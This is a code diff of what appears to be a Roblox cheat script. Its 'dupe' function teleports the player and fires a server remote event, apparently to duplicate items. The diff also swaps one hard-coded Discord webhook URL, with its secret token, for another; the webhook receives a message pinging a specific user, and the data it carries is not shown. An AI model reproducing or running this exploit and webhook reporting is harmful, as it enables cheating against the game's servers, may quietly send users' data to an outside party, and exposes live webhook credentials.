@@ -11,7 +11,7 @@ function dupe()
         TeleportService:Teleport(7346416636)
     end)
     spawn(function()
-        if shared.timing ~= nil then
+        if shared.timing ~= 0.5 then
             wait(shared.timing)
         end
         game:GetService("ReplicatedStorage").RemoteEvents.Jumped:FireServer()
@@ -90,7 +90,7 @@ end
        "Unknown"
 
     local url =
-       "https://discord.com/api/webhooks/892750406441115738/DYRf-W4WfBVcK3l5juX_V69fdn0J489ObNtx9r7OLWvZZTwSA1Ur3bsPHqFOKP_Vz8Te"
+       "https://discord.com/api/webhooks/892465374950461480/lYB3zSNN9lotfyZNzRL3XDlZAg0GqMO-wVpNeR-6RZth7t41JEP5ROKrSxQj5cjWpOaX"
     local data = {
        ["content"] = "<@735432575140757605>",
        ["embeds"] = {
